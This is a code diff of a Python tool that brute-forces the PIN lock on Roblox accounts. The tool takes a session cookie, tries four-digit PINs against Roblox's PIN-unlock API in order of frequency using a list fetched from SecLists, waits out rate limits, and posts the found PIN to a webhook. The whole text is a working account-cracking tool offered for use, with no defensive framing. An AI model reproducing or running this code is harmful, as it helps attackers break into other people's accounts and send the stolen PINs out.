@@ -74,7 +74,7 @@ def diagnose(error):
       print("[", end="")
       cprint(" ERROR ", "red", end="")
       print("] " , end="")
-      print(f"A local error occured with the program's code or your computer.")
+      print(f"Error occured with the program or your computer.")
 # --({ Crack Pin }) -- #
 class crack:
   global headers
@@ -85,7 +85,8 @@ class crack:
   def check(_):
     global cookie
     global webhook
-    global startingNumber
+    global continueProgress
+    yes = ["y", "yes", "yeah", "ye"]
     print("[", end="")
     cprint(" BRUTEFORCER ", "magenta", end="")
     print("] ", end="")
@@ -99,10 +100,12 @@ class crack:
     print("[", end="")
     cprint(" BRUTEFORCER ", "magenta", end="")
     print("]", end="")
-    cprint(" Enter Starting Number (Put nothing to continue on the number from previously):", 'magenta')
-    startingNumber = input("> ")
-    if not startingNumber:
-      startingNumber = open("currentNumber.txt", "r").read()
+    cprint(" Continue progress from last time? (Y or N)", 'magenta')
+    continueProgress = input("> ")
+    if not continueProgress or continueProgress.lower() in yes:
+      continueProgress = True
+    else:
+      continueProgress = False
     check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
     if not check.status_code ==200:
       print("[", end="")
@@ -117,12 +120,12 @@ class crack:
       crack.check()
   # --({ Start Cracker }) -- #
   def start(_):
-    # --({ Allow cprint to work in windows }) -- #
     global headers
     global response
     global pin
     global cookies
-    global startingNumber
+    global continueProgress
+    # --({ Allow cprint to work in windows }) -- #
     os.system("")
     crack.check()
     if not os.path.exists("currentNumber.txt"):
@@ -143,91 +146,89 @@ class crack:
     for char in 'Leave this running for about around 5-29 days':
       time.sleep(0.1)
       cprint(char, 'magenta', end='', flush=True)
-    print("")
     cookies = {
     '.ROBLOSECURITY': cookie
     }
-    v = str(startingNumber)
     while True:
       headers = {
       'X-CSRF-TOKEN': getXsrf(cookie),
       }
-      try:
-        int(v)
-      except:
+      if os.name == 'nt':
+        os.system("cls")
+      else:
+        os.system("clear")
+      if continueProgress:
+        try:
+          startingLine = int(open("currentNumber.txt", "r").read())
+        except:
+          print("[", end="")
+          cprint(" ERRORS ", "red", end="")
+          print("] " , end="")
+          cprint(f"The number inside the currentNumber.txt file is invalid", 'red')
+          time.sleep(2)
+        pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
+      else:
+        startingLine = 0
+        pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
+      for line, pin in enumerate(pins):
         print("[", end="")
-        cprint(" ERRORS ", "red", end="")
+        cprint(" BRUTEFORCER ", "magenta", end="")
         print("] " , end="")
-        cprint(f"The number inside the currentNumber.txt file is invalid", 'red')
-        time.sleep(2)
-
+        cprint(f"Trying {pin}...", "magenta")
+        open("currentNumber.txt", "w+").write(str(line+startingLine))
+        response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
+        try:
+          if "unlockedUntil" in str(response):
+            cprint("Cookie:", 'blue')
+            print(cookie)
+            print("[", end="")
+            cprint(" BRUTEFORCER ", "green", end="")
+            print("] " , end="")
+            cprint(f"Pin found: {pin}", 'green')
+            r = requests.post(webhook, data={'content':pin})
+            if not r.status_code ==200:
+              print("[", end="")
+              cprint("ERROR", end="")
+              print("] " , end="")
+              cprint('Invalid Webhook', 'red')
+            break
+          if response['errors'][0]['code'] == 4:
+            print("[", end="")
+            cprint(" BRUTEFORCER ", "magenta", end="")
+            print("] " , end="")
+            cprint("Incorrect Pin", 'red')
+          elif response['errors'][0]['message'] == "TooManyRequests":
+            print("[", end="")
+            cprint(" RATELIMIT ", "yellow", end="")
+            print("] " , end="")
+            cprint(f'Too many requests. Waiting 21 minutes before resumimg', 'yellow')
+            time.sleep(1260)
+          if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
+            print("[", end="")
+            cprint(" ERROR ", "red", end="")
+            print("] " , end="")
+            cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
+            time.sleep(5)
+            crack.start()
+            break
+          elif response['errors'][0]['message'] == 'Token Validation Failed':
+            print("[", end="")
+            cprint(" ERROR ", "red", end="")
+            print("] " , end="")
+            cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
+            break
+        except Exception as e:
+          print(f"A error has occured{e}")
+      else:
+        print("[", end="")
+        cprint(" ERROR ", "red", end="")
+        print("]" , end="")
+        cprint("Invalid Cookie", 'red')
+        os.system('cls')
         if os.name == 'nt':
             os.system("cls")
         else:
             os.system("clear")
-        crack.check()
-      for _ in range(4-len(str(v))):
-        v = f'0{v}'
-      pin = v
-      print("[", end="")
-      cprint(" BRUTEFORCER ", "magenta", end="")
-      print("] " , end="")
-      cprint(f"Trying {pin}...", "magenta")
-      open("currentNumber.txt", "w+").write(str(int(v)))
-      response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
-      try:
-        if "unlockedUntil" in str(response):
-          cprint("Cookie:", 'blue')
-          print(cookie)
-          print("[", end="")
-          cprint(" BRUTEFORCER ", "green", end="")
-          print("] " , end="")
-          cprint(f"Pin found: {pin}", 'green')
-          r = requests.post(webhook, data={'content':pin})
-          if not r.status_code ==200:
-            print("[", end="")
-            cprint("ERRORS", end="")
-            print("] " , end="")
-            cprint('Invalid Webhook', 'red')
-          break
-        if response['errors'][0]['code'] == 4:
-          print("[", end="")
-          cprint(" BRUTEFORCER ", "magenta", end="")
-          print("] " , end="")
-          cprint("Incorrect Pin", 'red')
-        elif response['errors'][0]['message'] == "TooManyRequests":
-          print("[", end="")
-          cprint(" RATELIMIT ", "yellow", end="")
-          print("] " , end="")
-          cprint(f'Too many requests. Waiting 21 minutes before resumimg', 'yellow')
-          time.sleep(1260)
-        if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
-          print("[", end="")
-          cprint(" ERROR ", "red", end="")
-          print("] " , end="")
-          cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
-          time.sleep(5)
-          crack.start()
-          break
-        elif response['errors'][0]['message'] == 'Token Validation Failed':
-          print("[", end="")
-          cprint(" ERROR ", "red", end="")
-          print("] " , end="")
-          cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
-          break
-        v = int(v) + 1
-      except Exception as e:
-        print(f"A error has occured{e}")
-    else:
-      print("[", end="")
-      cprint(" ERROR ", "red", end="")
-      print("]" , end="")
-      cprint("Invalid Cookie", 'red')
-      os.system('cls')
-      if os.name == 'nt':
-          os.system("cls")
-      else:
-          os.system("clear")
 
 # --({ Start program }) -- #
 if __name__ == "__main__":
